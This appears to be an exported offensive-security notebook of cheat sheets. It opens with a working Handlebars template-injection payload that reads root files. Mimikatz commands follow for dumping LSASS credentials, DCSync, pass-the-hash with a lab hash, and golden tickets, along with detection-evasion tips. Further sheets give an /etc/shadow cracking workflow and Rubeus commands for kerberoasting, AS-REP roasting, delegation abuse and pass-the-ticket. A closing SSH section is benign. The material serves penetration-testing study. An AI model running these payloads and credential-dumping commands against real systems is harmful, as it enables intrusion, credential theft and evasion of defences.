<h1 id="server-side-template-injection"><a class="header" href="#server-side-template-injection">Server Side Template Injection</a></h1>
<p>Server Side Template Injection (SSTI) is a vulnerability that allows an attacker to inject malicious template code into a web application. This can lead to remote code execution, data leakage, and other security issues.</p>
<h2 id="example-1"><a class="header" href="#example-1">Example:</a></h2>
<pre><code class="language-handlebars">{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('fs').readFileSync('/root/some-file',{encoding:'utf8',flag:'r'});"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
</code></pre>
<p>You will first need to encode this payload using URL encoding before sending it to the server. Once encoded, you can include it in a request to the vulnerable web application via a query parameter, form field, or HTTP header, depending on where the SSTI vulnerability exists.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="mimikatz-cheatsheet"><a class="header" href="#mimikatz-cheatsheet">Mimikatz Cheatsheet</a></h1>
<h2 id="basic-syntax-3"><a class="header" href="#basic-syntax-3">Basic Syntax</a></h2>
<pre><code class="language-cmd">mimikatz.exe "command1" "command2" "exit"
</code></pre>
<p>Always start with:</p>
<pre><code>privilege::debug
</code></pre>
<hr>
<h2 id="quick-reference-commands-1"><a class="header" href="#quick-reference-commands-1">Quick Reference Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>privilege::debug</code></td><td>Enable debug privileges (required)</td></tr>
<tr><td><code>sekurlsa::logonpasswords</code></td><td>Dump all credentials from LSASS</td></tr>
<tr><td><code>sekurlsa::credman</code></td><td>Dump Credential Manager secrets</td></tr>
<tr><td><code>sekurlsa::tickets /export</code></td><td>Export Kerberos tickets</td></tr>
<tr><td><code>lsadump::sam</code></td><td>Dump local SAM database</td></tr>
<tr><td><code>lsadump::secrets</code></td><td>Dump LSA secrets</td></tr>
<tr><td><code>lsadump::cache</code></td><td>Dump cached domain credentials</td></tr>
<tr><td><code>lsadump::dcsync /user:Administrator</code></td><td>DCSync attack</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="modules-overview"><a class="header" href="#modules-overview">Modules Overview</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Module</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>sekurlsa</code></td><td>Extract credentials from LSASS memory</td></tr>
<tr><td><code>lsadump</code></td><td>Dump LSA secrets, SAM, DCSync</td></tr>
<tr><td><code>kerberos</code></td><td>Kerberos ticket operations</td></tr>
<tr><td><code>vault</code></td><td>Windows Vault/Credential Manager</td></tr>
<tr><td><code>dpapi</code></td><td>DPAPI decryption</td></tr>
<tr><td><code>crypto</code></td><td>Certificate and key operations</td></tr>
<tr><td><code>token</code></td><td>Token manipulation</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="sekurlsa-module"><a class="header" href="#sekurlsa-module">sekurlsa Module</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>sekurlsa::logonpasswords</code></td><td>Dump all logon passwords</td></tr>
<tr><td><code>sekurlsa::credman</code></td><td>Dump Credential Manager</td></tr>
<tr><td><code>sekurlsa::dpapi</code></td><td>Dump DPAPI masterkeys</td></tr>
<tr><td><code>sekurlsa::tickets</code></td><td>List Kerberos tickets</td></tr>
<tr><td><code>sekurlsa::tickets /export</code></td><td>Export tickets to .kirbi files</td></tr>
<tr><td><code>sekurlsa::wdigest</code></td><td>Dump WDigest credentials</td></tr>
<tr><td><code>sekurlsa::ekeys</code></td><td>Dump Kerberos encryption keys</td></tr>
</tbody>
</table>
</div>
<h3 id="pass-the-hash"><a class="header" href="#pass-the-hash">Pass-the-Hash</a></h3>
<pre><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /ntlm:&lt;hash&gt; /run:cmd.exe
</code></pre>
<h3 id="pass-the-hash-with-rc4"><a class="header" href="#pass-the-hash-with-rc4">Pass-the-Hash (with RC4)</a></h3>
<pre><code>sekurlsa::pth /user:&lt;user&gt; /rc4:&lt;hash&gt; /domain:&lt;domain&gt; /run:cmd.exe
</code></pre>
<h3 id="pass-the-key--overpass-the-hash-with-aes256"><a class="header" href="#pass-the-key--overpass-the-hash-with-aes256">Pass the Key / OverPass the Hash (with AES256)</a></h3>
<pre><code>sekurlsa::pth /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;aes256_hash&gt; /run:cmd.exe
</code></pre>
<h3 id="extract-kerberos-keys-for-pass-the-key"><a class="header" href="#extract-kerberos-keys-for-pass-the-key">Extract Kerberos Keys (for Pass the Key)</a></h3>
<pre><code>sekurlsa::ekeys
</code></pre>
<hr>
<h2 id="lsadump-module"><a class="header" href="#lsadump-module">lsadump Module</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>lsadump::sam</code></td><td>Dump SAM database (local accounts)</td></tr>
<tr><td><code>lsadump::secrets</code></td><td>Dump LSA secrets</td></tr>
<tr><td><code>lsadump::cache</code></td><td>Dump cached domain creds (DCC2)</td></tr>
<tr><td><code>lsadump::trust</code></td><td>Dump trust relationships</td></tr>
</tbody>
</table>
</div>
<h3 id="dcsync-attack"><a class="header" href="#dcsync-attack">DCSync Attack</a></h3>
<pre><code>lsadump::dcsync /domain:domain.local /user:Administrator
lsadump::dcsync /domain:domain.local /user:krbtgt
lsadump::dcsync /domain:domain.local /all /csv
</code></pre>
<h3 id="offline-sam-dump"><a class="header" href="#offline-sam-dump">Offline SAM Dump</a></h3>
<pre><code>lsadump::sam /sam:sam.hive /system:system.hive
</code></pre>
<h3 id="offline-lsa-secrets"><a class="header" href="#offline-lsa-secrets">Offline LSA Secrets</a></h3>
<pre><code>lsadump::secrets /system:system.hive /security:security.hive
</code></pre>
<hr>
<h2 id="kerberos-attacks"><a class="header" href="#kerberos-attacks">Kerberos Attacks</a></h2>
<h3 id="golden-ticket"><a class="header" href="#golden-ticket">Golden Ticket</a></h3>
<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_sid&gt; /krbtgt:&lt;krbtgt_hash&gt; /ptt
</code></pre>
<h3 id="silver-ticket"><a class="header" href="#silver-ticket">Silver Ticket</a></h3>
<pre><code>kerberos::golden /user:Administrator /domain:domain.local /sid:&lt;domain_sid&gt; /target:&lt;server&gt; /service:&lt;svc&gt; /rc4:&lt;svc_hash&gt; /ptt
</code></pre>
<h3 id="ticket-operations"><a class="header" href="#ticket-operations">Ticket Operations</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>kerberos::list</code></td><td>List current tickets</td></tr>
<tr><td><code>kerberos::ptt &lt;file.kirbi&gt;</code></td><td>Pass-the-Ticket</td></tr>
<tr><td><code>kerberos::purge</code></td><td>Purge all tickets</td></tr>
<tr><td><code>kerberos::tgt</code></td><td>Get current TGT</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="dpapi--vault"><a class="header" href="#dpapi--vault">DPAPI &amp; Vault</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>vault::list</code></td><td>List vault credentials</td></tr>
<tr><td><code>vault::cred</code></td><td>Dump vault credentials</td></tr>
<tr><td><code>dpapi::cred /in:&lt;file&gt;</code></td><td>Decrypt credential file</td></tr>
<tr><td><code>dpapi::blob /in:&lt;file&gt; /masterkey:&lt;key&gt;</code></td><td>Decrypt DPAPI blob</td></tr>
<tr><td><code>dpapi::masterkey /in:&lt;file&gt; /rpc</code></td><td>Get masterkey via RPC</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="one-liners"><a class="header" href="#one-liners">One-Liners</a></h2>
<h3 id="full-credential-dump"><a class="header" href="#full-credential-dump">Full Credential Dump</a></h3>
<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
</code></pre>
<h3 id="dump-sam"><a class="header" href="#dump-sam">Dump SAM</a></h3>
<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "lsadump::sam" "exit"
</code></pre>
<h3 id="dcsync-krbtgt"><a class="header" href="#dcsync-krbtgt">DCSync krbtgt</a></h3>
<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:domain.local /user:krbtgt" "exit"
</code></pre>
<h3 id="pass-the-hash-1"><a class="header" href="#pass-the-hash-1">Pass-the-Hash</a></h3>
<pre><code class="language-cmd">mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
</code></pre>
<h3 id="export-all-kerberos-tickets"><a class="header" href="#export-all-kerberos-tickets">Export All Kerberos Tickets</a></h3>
<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
</code></pre>
<h3 id="golden-ticket-attack"><a class="header" href="#golden-ticket-attack">Golden Ticket Attack</a></h3>
<pre><code class="language-cmd">mimikatz.exe "privilege::debug" "kerberos::golden /user:Administrator /domain:domain.local /sid:S-1-5-21-... /krbtgt:&lt;hash&gt; /ptt" "exit"
</code></pre>
<hr>
<h2 id="common-errors"><a class="header" href="#common-errors">Common Errors</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Error</th><th>Solution</th></tr>
</thead>
<tbody>
<tr><td><code>ERROR kuhl_m_sekurlsa_acquireLSA</code></td><td>Run as Administrator</td></tr>
<tr><td><code>Privilege '20' KO</code></td><td>Need local admin rights</td></tr>
<tr><td><code>Handle on memory</code></td><td>LSASS protected, try offline dump</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="evasion-tips"><a class="header" href="#evasion-tips">Evasion Tips</a></h2>
<ul>
<li>Dump LSASS with <code>procdump -ma lsass.exe lsass.dmp</code> and analyze offline</li>
<li>Use <code>pypykatz</code> for cross-platform offline analysis</li>
<li>Use PowerShell <code>Invoke-Mimikatz</code> with AMSI bypass</li>
<li>Obfuscate or recompile from source</li>
</ul>
<hr>
<h2 id="related-commands"><a class="header" href="#related-commands">Related Commands</a></h2>
<h3 id="create-lsass-dump-for-offline-analysis"><a class="header" href="#create-lsass-dump-for-offline-analysis">Create LSASS Dump (for offline analysis)</a></h3>
<pre><code class="language-cmd">procdump.exe -ma lsass.exe lsass.dmp
</code></pre>
<h3 id="analyze-with-pypykatz-linux"><a class="header" href="#analyze-with-pypykatz-linux">Analyze with pypykatz (Linux)</a></h3>
<pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="unshadow-cheatsheet"><a class="header" href="#unshadow-cheatsheet">Unshadow Cheatsheet</a></h1>
<h2 id="basic-syntax-4"><a class="header" href="#basic-syntax-4">Basic Syntax</a></h2>
<pre><code>unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
</code></pre>
<hr>
<h2 id="description"><a class="header" href="#description">Description</a></h2>
<p><code>unshadow</code> is a utility included with John the Ripper that combines <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a single file suitable for password cracking. This is the format that John‚Äôs single crack mode was designed for.</p>
<hr>
<h2 id="basic-usage-2"><a class="header" href="#basic-usage-2">Basic Usage</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>unshadow passwd shadow &gt; hashes.txt</code></td><td>Combine files for cracking</td></tr>
<tr><td><code>unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; unshadowed.hashes</code></td><td>Using backup copies</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="workflow"><a class="header" href="#workflow">Workflow</a></h2>
<h3 id="1-copy-system-files"><a class="header" href="#1-copy-system-files">1. Copy System Files</a></h3>
<pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
sudo cp /etc/shadow /tmp/shadow.bak
</code></pre>
<h3 id="2-combine-with-unshadow"><a class="header" href="#2-combine-with-unshadow">2. Combine with unshadow</a></h3>
<pre><code class="language-sh">unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
</code></pre>
<h3 id="3-crack-with-john-single-mode---recommended"><a class="header" href="#3-crack-with-john-single-mode---recommended">3. Crack with John (Single Mode - Recommended)</a></h3>
<pre><code class="language-sh">john --single /tmp/unshadowed.hashes
</code></pre>
<h3 id="4-crack-with-john-wordlist-mode"><a class="header" href="#4-crack-with-john-wordlist-mode">4. Crack with John (Wordlist Mode)</a></h3>
<pre><code class="language-sh">john --wordlist=rockyou.txt /tmp/unshadowed.hashes
</code></pre>
<h3 id="5-crack-with-hashcat"><a class="header" href="#5-crack-with-hashcat">5. Crack with hashcat</a></h3>
<pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o cracked.txt
</code></pre>
<hr>
<h2 id="output-format"><a class="header" href="#output-format">Output Format</a></h2>
<p>The output combines user info from passwd with the hash from shadow:</p>
<pre><code>root:$6$xyz...:0:0:root:/root:/bin/bash
htb-student:$y$j9T$abc...:1000:1000:,,,:/home/htb-student:/bin/bash
</code></pre>
<hr>
<h2 id="common-hash-modes-hashcat"><a class="header" href="#common-hash-modes-hashcat">Common Hash Modes (hashcat)</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Mode</th><th>Algorithm</th><th>Identifier</th></tr>
</thead>
<tbody>
<tr><td>500</td><td>MD5crypt</td><td>$1$</td></tr>
<tr><td>1800</td><td>SHA-512crypt</td><td>$6$</td></tr>
<tr><td>7400</td><td>SHA-256crypt</td><td>$5$</td></tr>
<tr><td>3200</td><td>bcrypt</td><td>$2a$</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="tips"><a class="header" href="#tips">Tips</a></h2>
<ul>
<li>John‚Äôs <strong>single crack mode</strong> is ideal for unshadowed files as it uses GECOS data (full name, username) to generate candidate passwords</li>
<li>Always work with copies of system files, not the originals</li>
<li>The passwd file provides context (username, GECOS) that helps single crack mode</li>
<li>Requires root access to read <code>/etc/shadow</code></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="rubeus-cheatsheet"><a class="header" href="#rubeus-cheatsheet">Rubeus Cheatsheet</a></h1>
<h2 id="basic-syntax-5"><a class="header" href="#basic-syntax-5">Basic Syntax</a></h2>
<pre><code class="language-cmd">Rubeus.exe &lt;command&gt; [options]
</code></pre>
<hr>
<h2 id="quick-reference-commands-2"><a class="header" href="#quick-reference-commands-2">Quick Reference Commands</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Purpose</th></tr>
</thead>
<tbody>
<tr><td><code>dump</code></td><td>Dump all Kerberos tickets</td></tr>
<tr><td><code>asktgt</code></td><td>Request a TGT using hash or password</td></tr>
<tr><td><code>asktgs</code></td><td>Request a TGS for a specific service</td></tr>
<tr><td><code>ptt</code></td><td>Pass the Ticket (import ticket)</td></tr>
<tr><td><code>createnetonly</code></td><td>Create sacrificial logon session</td></tr>
<tr><td><code>renew</code></td><td>Renew a TGT</td></tr>
<tr><td><code>describe</code></td><td>Describe a ticket</td></tr>
<tr><td><code>hash</code></td><td>Calculate Kerberos hashes from password</td></tr>
<tr><td><code>kerberoast</code></td><td>Kerberoast attack</td></tr>
<tr><td><code>asreproast</code></td><td>AS-REP Roasting attack</td></tr>
<tr><td><code>s4u</code></td><td>S4U constrained delegation abuse</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="ticket-harvesting"><a class="header" href="#ticket-harvesting">Ticket Harvesting</a></h2>
<h3 id="dump-all-tickets-base64"><a class="header" href="#dump-all-tickets-base64">Dump All Tickets (Base64)</a></h3>
<pre><code class="language-cmd">Rubeus.exe dump /nowrap
</code></pre>
<h3 id="dump-tickets-for-current-user"><a class="header" href="#dump-tickets-for-current-user">Dump Tickets for Current User</a></h3>
<pre><code class="language-cmd">Rubeus.exe dump /user:current /nowrap
</code></pre>
<h3 id="dump-specific-service-tickets"><a class="header" href="#dump-specific-service-tickets">Dump Specific Service Tickets</a></h3>
<pre><code class="language-cmd">Rubeus.exe dump /service:krbtgt /nowrap
</code></pre>
<h3 id="triage-list-tickets"><a class="header" href="#triage-list-tickets">Triage (List Tickets)</a></h3>
<pre><code class="language-cmd">Rubeus.exe triage
</code></pre>
<hr>
<h2 id="request-tickets-asktgt"><a class="header" href="#request-tickets-asktgt">Request Tickets (asktgt)</a></h2>
<h3 id="request-tgt-with-ntlm-hash-rc4"><a class="header" href="#request-tgt-with-ntlm-hash-rc4">Request TGT with NTLM Hash (RC4)</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;ntlm_hash&gt; /nowrap
</code></pre>
<h3 id="request-tgt-with-aes256-hash"><a class="header" href="#request-tgt-with-aes256-hash">Request TGT with AES256 Hash</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;aes256_hash&gt; /nowrap
</code></pre>
<h3 id="request-tgt-with-password"><a class="header" href="#request-tgt-with-password">Request TGT with Password</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /password:&lt;password&gt; /nowrap
</code></pre>
<h3 id="request-tgt-and-import-ptt"><a class="header" href="#request-tgt-and-import-ptt">Request TGT and Import (/ptt)</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt
</code></pre>
<h3 id="request-tgt-using-domain-controller"><a class="header" href="#request-tgt-using-domain-controller">Request TGT Using Domain Controller</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /rc4:&lt;hash&gt; /dc:&lt;dc_ip&gt; /nowrap
</code></pre>
<hr>
<h2 id="pass-the-ticket-ptt"><a class="header" href="#pass-the-ticket-ptt">Pass the Ticket (ptt)</a></h2>
<h3 id="import-kirbi-file"><a class="header" href="#import-kirbi-file">Import .kirbi File</a></h3>
<pre><code class="language-cmd">Rubeus.exe ptt /ticket:&lt;path_to_kirbi&gt;
</code></pre>
<h3 id="import-base64-ticket"><a class="header" href="#import-base64-ticket">Import Base64 Ticket</a></h3>
<pre><code class="language-cmd">Rubeus.exe ptt /ticket:&lt;base64_encoded_ticket&gt;
</code></pre>
<hr>
<h2 id="sacrificial-process-createnetonly"><a class="header" href="#sacrificial-process-createnetonly">Sacrificial Process (createnetonly)</a></h2>
<p>Create a hidden process with a new logon session:</p>
<pre><code class="language-cmd">Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
</code></pre>
<p>Then in the new window, request a ticket:</p>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:&lt;user&gt; /domain:&lt;domain&gt; /aes256:&lt;hash&gt; /ptt
</code></pre>
<hr>
<h2 id="kerberoasting"><a class="header" href="#kerberoasting">Kerberoasting</a></h2>
<h3 id="kerberoast-all-users"><a class="header" href="#kerberoast-all-users">Kerberoast All Users</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /nowrap
</code></pre>
<h3 id="kerberoast-specific-user"><a class="header" href="#kerberoast-specific-user">Kerberoast Specific User</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /user:&lt;username&gt; /nowrap
</code></pre>
<h3 id="kerberoast-with-output-format-for-hashcat"><a class="header" href="#kerberoast-with-output-format-for-hashcat">Kerberoast with Output Format for Hashcat</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /nowrap
</code></pre>
<h3 id="kerberoast-with-aes-encryption"><a class="header" href="#kerberoast-with-aes-encryption">Kerberoast with AES Encryption</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /aes /nowrap
</code></pre>
<hr>
<h2 id="as-rep-roasting"><a class="header" href="#as-rep-roasting">AS-REP Roasting</a></h2>
<h3 id="as-rep-roast-all-users"><a class="header" href="#as-rep-roast-all-users">AS-REP Roast All Users</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /nowrap
</code></pre>
<h3 id="as-rep-roast-specific-user"><a class="header" href="#as-rep-roast-specific-user">AS-REP Roast Specific User</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /user:&lt;username&gt; /nowrap
</code></pre>
<h3 id="as-rep-roast-with-hashcat-format"><a class="header" href="#as-rep-roast-with-hashcat-format">AS-REP Roast with Hashcat Format</a></h3>
<pre><code class="language-cmd">Rubeus.exe asreproast /format:hashcat /nowrap
</code></pre>
<hr>
<h2 id="request-service-tickets-asktgs"><a class="header" href="#request-service-tickets-asktgs">Request Service Tickets (asktgs)</a></h2>
<h3 id="request-tgs-for-service"><a class="header" href="#request-tgs-for-service">Request TGS for Service</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/server.domain.local /nowrap
</code></pre>
<h3 id="request-tgs-and-import"><a class="header" href="#request-tgs-and-import">Request TGS and Import</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgs /ticket:&lt;tgt_base64&gt; /service:cifs/server.domain.local /ptt
</code></pre>
<hr>
<h2 id="constrained-delegation-s4u"><a class="header" href="#constrained-delegation-s4u">Constrained Delegation (S4U)</a></h2>
<h3 id="s4u2self-and-s4u2proxy"><a class="header" href="#s4u2self-and-s4u2proxy">S4U2Self and S4U2Proxy</a></h3>
<pre><code class="language-cmd">Rubeus.exe s4u /user:&lt;service_account&gt; /rc4:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /ptt
</code></pre>
<h3 id="s4u-with-alternate-service"><a class="header" href="#s4u-with-alternate-service">S4U with Alternate Service</a></h3>
<pre><code class="language-cmd">Rubeus.exe s4u /user:&lt;service_account&gt; /aes256:&lt;hash&gt; /impersonateuser:Administrator /msdsspn:cifs/target.domain.local /altservice:ldap /ptt
</code></pre>
<hr>
<h2 id="ticket-operations-1"><a class="header" href="#ticket-operations-1">Ticket Operations</a></h2>
<h3 id="describe-a-ticket"><a class="header" href="#describe-a-ticket">Describe a Ticket</a></h3>
<pre><code class="language-cmd">Rubeus.exe describe /ticket:&lt;base64_or_path&gt;
</code></pre>
<h3 id="renew-a-tgt"><a class="header" href="#renew-a-tgt">Renew a TGT</a></h3>
<pre><code class="language-cmd">Rubeus.exe renew /ticket:&lt;base64_or_path&gt; /nowrap
</code></pre>
<h3 id="purge-tickets-current-session"><a class="header" href="#purge-tickets-current-session">Purge Tickets (Current Session)</a></h3>
<pre><code class="language-cmd">Rubeus.exe purge
</code></pre>
<h3 id="purge-tickets-specific-luid"><a class="header" href="#purge-tickets-specific-luid">Purge Tickets (Specific LUID)</a></h3>
<pre><code class="language-cmd">Rubeus.exe purge /luid:&lt;luid&gt;
</code></pre>
<hr>
<h2 id="hash-calculation"><a class="header" href="#hash-calculation">Hash Calculation</a></h2>
<h3 id="calculate-kerberos-hashes-from-password"><a class="header" href="#calculate-kerberos-hashes-from-password">Calculate Kerberos Hashes from Password</a></h3>
<pre><code class="language-cmd">Rubeus.exe hash /user:&lt;username&gt; /domain:&lt;domain&gt; /password:&lt;password&gt;
</code></pre>
<p>Output includes:</p>
<ul>
<li>rc4_hmac (NTLM)</li>
<li>aes128_cts_hmac_sha1</li>
<li>aes256_cts_hmac_sha1</li>
<li>des_cbc_md5</li>
</ul>
<hr>
<h2 id="monitoring"><a class="header" href="#monitoring">Monitoring</a></h2>
<h3 id="monitor-for-tgts-4624-logon-events"><a class="header" href="#monitor-for-tgts-4624-logon-events">Monitor for TGTs (4624 Logon Events)</a></h3>
<pre><code class="language-cmd">Rubeus.exe monitor /interval:5
</code></pre>
<h3 id="monitor-with-filtering"><a class="header" href="#monitor-with-filtering">Monitor with Filtering</a></h3>
<pre><code class="language-cmd">Rubeus.exe monitor /interval:5 /filteruser:&lt;username&gt;
</code></pre>
<hr>
<h2 id="common-options-5"><a class="header" href="#common-options-5">Common Options</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>/nowrap</code></td><td>Don‚Äôt wrap Base64 output (easier copy-paste)</td></tr>
<tr><td><code>/ptt</code></td><td>Pass the ticket (import into current session)</td></tr>
<tr><td><code>/dc:&lt;ip&gt;</code></td><td>Specify domain controller</td></tr>
<tr><td><code>/domain:&lt;domain&gt;</code></td><td>Specify domain</td></tr>
<tr><td><code>/user:&lt;user&gt;</code></td><td>Specify user</td></tr>
<tr><td><code>/outfile:&lt;path&gt;</code></td><td>Write ticket to file</td></tr>
<tr><td><code>/luid:&lt;luid&gt;</code></td><td>Target specific logon session</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="one-liners-1"><a class="header" href="#one-liners-1">One-Liners</a></h2>
<h3 id="dump-all-tickets"><a class="header" href="#dump-all-tickets">Dump All Tickets</a></h3>
<pre><code class="language-cmd">Rubeus.exe dump /nowrap
</code></pre>
<h3 id="request-tgt-and-import"><a class="header" href="#request-tgt-and-import">Request TGT and Import</a></h3>
<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
</code></pre>
<h3 id="kerberoast-and-save"><a class="header" href="#kerberoast-and-save">Kerberoast and Save</a></h3>
<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
</code></pre>
<h3 id="create-sacrificial-session-and-request-tgt"><a class="header" href="#create-sacrificial-session-and-request-tgt">Create Sacrificial Session and Request TGT</a></h3>
<pre><code class="language-cmd">Rubeus.exe createnetonly /program:cmd.exe /show
:: In new window:
Rubeus.exe asktgt /user:john /domain:domain.local /rc4:&lt;hash&gt; /ptt
</code></pre>
<hr>
<h2 id="convert-kirbi-to-base64-powershell"><a class="header" href="#convert-kirbi-to-base64-powershell">Convert .kirbi to Base64 (PowerShell)</a></h2>
<pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
</code></pre>
<h2 id="convert-base64-to-kirbi-powershell"><a class="header" href="#convert-base64-to-kirbi-powershell">Convert Base64 to .kirbi (PowerShell)</a></h2>
<pre><code class="language-powershell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;base64_string&gt;"))
</code></pre>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="ssh-cheatsheet"><a class="header" href="#ssh-cheatsheet">SSH Cheatsheet</a></h1>
<h2 id="basic-connection"><a class="header" href="#basic-connection">Basic Connection</a></h2>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Command</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>ssh user@host</code></td><td>Connect to remote host</td></tr>
<tr><td><code>ssh -p 2222 user@host</code></td><td>Connect on custom port</td></tr>
<tr><td><code>ssh -i ~/.ssh/key.pem user@host</code></td><td>Connect with specific key</td></tr>
<tr><td><code>ssh -v user@host</code></td><td>Verbose mode (debug)</td></tr>
<tr><td><code>ssh -vvv user@host</code></td><td>Extra verbose</td></tr>
</tbody>
</table>
</div>
<hr>
<h2 id="authentication-1"><a class="header" href="#authentication-1">Authentication</a></h2>
<h3 id="key-based-auth"><a class="header" href="#key-based-auth">Key-Based Auth</a></h3>
<pre><code class="language-bash"># Generate key pair
ssh-keygen -t ed25519 -C "comment"
ssh-keygen -t rsa -b 4096 -C "comment"

# Copy public key to server
ssh-copy-id user@host
ssh-copy-id -i ~/.ssh/key.pub user@host

# Manual copy
cat ~/.ssh/id_ed25519.pub | ssh user@host "mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys"
</code></pre>
<h3 id="key-permissions"><a class="header" href="#key-permissions">Key Permissions</a></h3>
<pre><code class="language-bash">chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_ed25519
chmod 644 ~/.ssh/id_ed25519.pub
chmod 600 ~/.ssh/authorized_keys
chmod 600 ~/.ssh/config
</code></pre>
<hr>
<h2 id="ssh-config-file"><a class="header" href="#ssh-config-file">SSH Config File</a></h2>
<p>Location: <code>~/.ssh/config</code></p>
<pre><code>Host myserver
    HostName 192.168.1.100
    User admin
    Port 22
    IdentityFile ~/.ssh/myserver_key

Host jumpbox
    HostName jump.example.com
    User deployer
    IdentityFile ~/.ssh/jump_key

Host internal
    HostName 10.0.0.50
    User admin
    ProxyJump jumpbox
</code></pre>
<h3 id="config-options"><a class="header" href="#config-options">Config Options</a></h3>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Option</th><th>Description</th></tr>
</thead>
<tbody>
<tr><td><code>HostName</code></td><td>Actual hostname/IP</td></tr>
<tr><td><code>User</code></td><td>Default username</td></tr>
<tr><td><code>Port</code></td><td>SSH port</td></tr>
<tr><td><code>IdentityFile</code></td><td>Path to private key</td></tr>
<tr><td><code>ProxyJump</code></td><td>Jump host for tunneling</td></tr>
<tr><td><code>ForwardAgent</code></td><td>Forward SSH agent (yes/no)</td></tr>
<tr><td><code>LocalForward</code></td><td>Persistent local tunnel</td></tr>
<tr><td><code>DynamicForward</code></td><td>Persistent SOCKS proxy</td></tr>
</tbody>
</table>
</div>
<hr>
